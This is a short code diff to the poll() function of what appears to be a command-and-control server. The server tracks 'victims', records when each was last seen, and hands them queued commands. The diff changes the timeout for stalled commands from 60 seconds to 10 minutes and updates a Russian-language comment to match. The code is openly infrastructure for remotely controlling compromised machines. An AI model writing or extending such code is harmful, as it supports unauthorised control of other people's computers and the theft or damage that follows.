@@ -75,9 +75,9 @@ def poll():
     now = int(time.time())
     with db() as c:
         c.execute("UPDATE victims SET last_seen=? WHERE id=?", (now, vid))
-        # Сбрасываем зависшие команды (висят больше 60 секунд)
+        # Сбрасываем зависшие команды (висят больше 10 минут)
         c.execute("UPDATE commands SET result='[timeout]', finished=1 WHERE victim_id=? AND finished=0 AND issued < ?",
-                  (vid, now - 60))
+                  (vid, now - 600))
                   
         row = c.execute("SELECT id,cmd FROM commands WHERE victim_id=? AND finished=0 ORDER BY id LIMIT 1",
                         (vid,)).fetchone()
